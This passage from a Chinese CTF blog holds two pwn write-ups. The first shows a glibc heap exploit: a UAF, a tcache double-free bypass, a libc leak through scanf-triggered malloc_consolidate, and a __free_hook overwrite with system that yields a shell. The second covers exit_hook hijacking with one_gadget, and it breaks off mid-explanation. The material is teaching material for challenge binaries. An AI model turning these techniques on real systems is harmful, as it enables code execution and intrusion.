              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-06-28 16:31:18 / 修改时间：18:43:58" itemprop="dateCreated datePublished" datetime="2022-06-28T16:31:18+08:00">2022-06-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li><p>scanf函数中例如：<code>__isoc99_scanf(&quot;%ld&quot;, &amp;v5);</code>这种情况，其会将我们的输入解析成长整型整数，虽然不会发生栈溢出，但是其没有限制我们的输入长度，当我们的输入比较短时，其缓冲区在栈上，但是如果输入很长（我试了一下，最少要0x400时才会向堆申请），那么其就会申请一个对应大小的chunk作为缓冲区，函数结束之后再free掉这个chunk。</p>
</li>
<li><p>tcache用chunk的bk指针作为标识符来识别double free，这个标识会在chunk进入tcache时被设置，如果存在uaf能修改tcache chunk的bk指针，就可以在tcache中实现double free</p>
</li>
</ol>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>菜单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1. allocate&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2. edit&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">__printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Your choice: &quot;</span>);</span><br></pre></td></tr></table></figure>

<p>add功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 vars8; <span class="comment">// [rsp+8h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  vars8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v1);</span><br><span class="line">  v0 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">1</span> &amp;&amp; !size[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v1);</span><br><span class="line">    v2 = v1;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Too large&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">      <span class="keyword">if</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        size[v0] = v2;</span><br><span class="line">        heap[v0] = v3;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ vars8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v5);</span><br><span class="line">  v0 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( heap[v5] )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      v2 = size[v0];</span><br><span class="line">      v3 = heap[v0];</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = &amp;v3[v2];</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          read(<span class="number">0</span>, v3, <span class="number">1uLL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( *v3 == <span class="number">10</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ++v3 == v4 )</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">        &#125;</span><br><span class="line">        *v3 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>delete功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v3);</span><br><span class="line">  v0 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = heap[v3];</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(v2);</span><br><span class="line">      size[v0] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>show功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = heap[v2];</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: %s\n&quot;</span>, v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见漏洞只有一个UAF，但是因为delete时将.bss段保存size的那部分置零了，所以delete之后不能直接edie它。</p>
<p>同时在add中可以看到，最多同时有两个可用的堆指针，并且申请chunk的大小最大为0x78，属于fast bin范围。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因为有UAF，所以泄漏堆地址不是问题，问题在于怎么绕过malloc大小的限制，将一个chunk放到别的bin中，以往的思路就是用UAF部分写tcache bin chunk的fd指针，从而构造堆重叠修改某个chunk的size域，但是对于这题而言就行不通，因为delete后无法再用这个delete过的堆指针来进行edit，其次如果使两个堆指针都指向同一个chunk的话那么可用的堆指针就不够了。</p>
<p>所以这里就要用到一个知识点，就是用scanf函数来申请一个大块，从而触发malloc_consolidate()函数，使得chunk能进入别的bin中，具体过程就是：①将一个chunk先放入fast bin中。② 在用scanf函数进行输入时输入一段过长的数据，使得scanf函数在堆中申请内存。③ 因为bin中并没有能符合scanf所需大小的chunk，那么就会触发malloc_consolidate()函数，fast bin中的那个chunk就会进入small bin，这样我们就能泄漏libc地址。</p>
<p>那么一步一步完成以上步骤</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>)</span><br></pre></td></tr></table></figure>

<p>上面步骤是为了让两个堆指针都指向同一个chunk，同时泄漏了堆地址</p>
<p>因为本题add函数会判断对应Index的size处有无值，只有当无值的时候才能进行malloc，换句话说就是对应的堆指针只有被free过之后才能进行新的add，所以我们需要绕过tcache的double free检测来free掉同一个chunk，为此我们需要让两个堆指针指向同一个chunk，这样才能在free掉它的同时修改其bk指针。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	edit(<span class="number">1</span>,p64(<span class="number">0</span>) + <span class="string">&#x27;\x10&#x27;</span>)	<span class="comment">#修改fd和bk指针</span></span><br><span class="line">	free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>到此为止bin如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0x80 [  7]: 0x55f878186260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x55f878186250 ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>我们已经成功将一个chunk放到fast bin，接下来在scanf输入时输入过长数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>

<p>然后malloc_consolidate()函数就会将fast bin中的chunk放到small bin中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0x80 [  7]: 0x55b431e11260 —▸ 0x7f08a0baed10 (main_arena+208) —▸ 0x7f08a0baed00 (main_arena+192) —▸ 0x7f08a0baecf0 (main_arena+176) —▸ 0x7f08a0baece0 (main_arena+160) ◂— ...</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x80: 0x55b431e11250 —▸ 0x7f08a0baed10 (main_arena+208) ◂— 0x55b431e11250</span><br></pre></td></tr></table></figure>

<p>这样就得到了libc地址</p>
<p>剩下的部分就很简单了，只不过由于这题的add功能函数只有当我们delete过对应堆指针后才能在其上面申请chunk的缘故，我们需要稍微麻烦一点构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">40</span> + p64(<span class="number">0x51</span>) + p64(free_hook))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>这部分也很简单，稍微想一下就行</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/06/22/exit-hook/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/22/exit-hook/" class="post-title-link" itemprop="url">exit_hook</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-06-22 14:14:51 / 修改时间：16:11:10" itemprop="dateCreated datePublished" datetime="2022-06-22T14:14:51+08:00">2022-06-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a>exit_hook</h3><p>详细的博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bhxdn/p/14222558.html">exit_hook在pwn题中的应用</a>、<a target="_blank" rel="noopener" href="https://www.freesion.com/article/9980545061/">exit_hook劫持</a></p>
<p>这里直接写总结：</p>
<ol>
<li><p>在exit函数的调用链中会根据存在于<code>_rtld_global</code>结构体中的两个函数指针分别调用这两个函数：<code>__rtld_lock_lock_recursive</code>、<code>__rtld_lock_unlock_recursive</code>，而这两个函数指针是可写的，所以能被劫持</p>
</li>
<li><p>程序中即便没有主动调用exit函数，在程序正常返回到<code>__libc_start_main</code>时其也会调用exit函数，所以这个打法可能很多情况下都能用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff7a2d840 &lt;__libc_start_main+240&gt;    mov    edi, eax</span><br><span class="line">  0x7ffff7a2d842 &lt;__libc_start_main+242&gt;    call   exit &lt;0x7ffff7a47040&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>所需条件就是有libc地址，能够任意地址写最少三个字节即可。</p>
<h4 id="hfctf-2020-marksman"><a href="#hfctf-2020-marksman" class="headerlink" title="hfctf_2020_marksman"></a>hfctf_2020_marksman</h4><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">3</span>]; <span class="comment">// [rsp+25h] [rbp-Bh] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_9BA(a1, a2, a3);</span><br><span class="line">  sub_A55();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Free shooting games! Three bullets available!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I placed the target near: %p\n&quot;</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;shoot!shoot!&quot;</span>);</span><br><span class="line">  v6 = sub_B78();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;biang!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;v7[i], <span class="number">1uLL</span>);</span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_BC2(v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )                  <span class="comment">// 任意地址写三个字节</span></span><br><span class="line">      *(j + v6) = v7[j];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !dlopen(<span class="number">0LL</span>, <span class="number">1</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bye~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>sub_B78()</code>函数中用<code>atol</code>函数返回了一个长整型，所以题目整体来说就是给了一个三个字节的任意地址写，而且程序一开始还给了libc</p>
<p>但是程序也有一点限制，在<code>sub_BC2(v7)</code>中限制了一些任意写的字节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_BC2</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (*a1 != <span class="number">0xC5</span> || a1[<span class="number">1</span>] != <span class="number">0xF2</span>) &amp;&amp; (*a1 != <span class="number">0x22</span> || a1[<span class="number">1</span>] != <span class="number">0xF3</span>) &amp;&amp; *a1 != <span class="number">0x8C</span> &amp;&amp; a1[<span class="number">1</span>] != <span class="number">0xA3</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You always want a Gold Finger!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而这些字节其实就是部分one_gadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>

<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>首先找到<code>_rtld_global</code>结构体于libc基址的偏移，要注意<code>_rtld_global</code>是在ld中的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;_rtld_global</span><br><span class="line">$1 = (struct rtld_global *) 0x7fee9af22060 &lt;_rtld_global&gt;</span><br></pre></td></tr></table></figure>

<p>然后找<code>__rtld_lock_unlock_recursive</code>于<code>_rtld_global</code>的偏移</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p _rtld_global</span><br><span class="line">...</span><br><span class="line">audit_data = &#123;&#123;</span><br><span class="line">      cookie = 0x0, </span><br><span class="line">      bindflags = 0x0</span><br><span class="line">    &#125; &lt;repeats 16 times&gt;&#125;, </span><br><span class="line">  _dl_rtld_lock_recursive = 0x7fee9acfb0e0 &lt;rtld_lock_default_lock_recursive&gt;, </span><br><span class="line">  _dl_rtld_unlock_recursive = 0x7fee9acfb0f0 &lt;rtld_lock_default_unlock_recursive&gt;, </span><br><span class="line">  _dl_make_stack_executable_hook = 0x7fee9ad0dd00 &lt;__GI__dl_make_stack_executable&gt;, </span><br><span class="line">  _dl_stack_flags = 0x6, </span><br><span class="line">  _dl_tls_dtv_gaps = 0x0, </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fee9af22f60 &lt;_rtld_global+3840&gt;:	0x00007fee9acfb0e0	0x00007fee9acfb0f0</span><br></pre></td></tr></table></figure>

<p>一般来说偏移会在<code>3840</code>上下</p>
<p>得到这两个偏移后就可以开始写入了，这时回到写入字节的限制，一般有两种方法：1.在one_gadget命令中加上<code>-l num</code>参数，这个参数会将一些不那么容易满足条件的one_gadget也显示出来，可以试一下这些。2.查看最初的几个one_gadget地址中往上的几条命令，看看有没有不影响程序最后执行的命令，如果有的话就可以以这个地址为one_gadget的起点从而绕过写入字节的限制。</p>
<p>比如说这题，我们查看偏移为<code>0x10a38c</code>的one_gadget上面的几条命令</p>
